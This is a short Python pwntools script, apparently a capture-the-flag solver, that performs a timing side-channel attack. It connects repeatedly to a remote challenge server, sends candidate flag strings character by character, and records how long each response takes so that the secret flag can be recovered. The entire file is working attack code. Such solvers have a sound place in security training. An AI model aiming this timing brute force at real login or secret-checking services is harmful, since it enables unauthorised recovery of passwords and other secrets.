from pwn import *
from datetime import datetime

charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'

f = open("test.txt", "w")

for x in charset:
  begin = datetime.now()

  r = remote('hackme.inndy.tw', 7708)
  r.recvuntil('?')
  test = "FLAG{" + x + "}"
  r.sendline(test)
  r.recvline()
  r.close()

  end = datetime.now()
  print test
  print end - begin
  f.write(test + " : ")
  f.write(str(end - begin) + "\n")

f.close()